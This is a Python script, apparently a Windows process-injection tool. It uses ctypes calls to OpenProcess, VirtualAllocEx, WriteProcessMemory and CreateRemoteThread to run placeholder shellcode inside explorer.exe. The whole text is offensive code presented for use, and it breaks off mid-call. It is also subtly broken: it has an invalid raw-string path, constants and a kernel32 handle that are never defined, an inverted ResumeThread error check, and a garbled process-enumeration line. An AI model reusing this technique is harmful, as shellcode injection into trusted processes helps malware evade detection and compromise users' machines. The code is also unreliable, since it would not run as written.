import os
import sys
from ctypes import *
from ctypes.wintypes import HANDLE, DWORD, BOOL, LPVOID
from struct import pack

def load_library(lib):
    lib_file = lib + '.dll'
    return CDLL(os.getenv('SYSTEMROOT', '') + r'\system32\' + lib_file)

def open_process(dwDesiredAccess=PROCESS_ALL_ACCESS, bInheritHandle=False, dwProcessId=None):
    hp = kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
    if hp == NULL: raise WinError()
    return hp

def virtualalloc(hProcess, lpAddress, dwSize, flAllocationType, flProtect):
    retval = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
    if retval == NULL: raise WinError()
    return retval

def writetoprocessmem(hProcess, lpBaseAddress, data, nNumberOfBytesToWrite):
    numberofbyteswritten = c_uint64(0)
    success = kernel32.WriteProcessMemory(hProcess, lpBaseAddress, data, nNumberOfBytesToWrite, byref(numberofbyteswritten))
    if success != TRUE: raise WinError()
    return True

def createremotethread(hProcess, lpParameter=NULL, dwCreationFlags=CREATE_SUSPENDED, lpStartAddr=NULL):
    hThread = kernel32.CreateRemoteThread(hProcess, NULL, 0, lpStartAddr, lpParameter, dwCreationFlags, NULL)
    if hThread == NULL: raise WinError()
    return hThread

def resumethread(hThread):
    success = kernel32.ResumeThread(hThread)
    if success <= 0xFFFFFFFF: raise WinError()
    return True

def closehandles(hp, hThread):
    kernel32.CloseHandle(hp)
    kernel32.CloseHandle(hThread)
    return True

# Example usage:
lpData = '\xcc\xcc\xcc\xcc'*500
shellcode = '' # Insert your shellcode here
data = bytearray([ord(i) for i in shellcode])

# Find PID of target process
targetProcName = 'explorer.exe'.encode('utf8')
targetPID = 0
psapi = load_library('PSAPI')
EnumProcesses = psapi.EnumProcesses
GetModuleFileNameExA = psapi.GetModuleFileNameExA
GetModuleFileNameExA.argtypes = [HANDLE, HANDLE, LPCSTR, DWORD]
GetModuleFileNameExA.restype = DWORD
MAX_PATH = 260
while True:
    pids = (DWORD * 1024)(*(map(lambda x: x[0], enumerate(range(1024))))).buffer_info()[0]
    bytesReturned = DWORD(0)
    result = EnumProcesses(pids
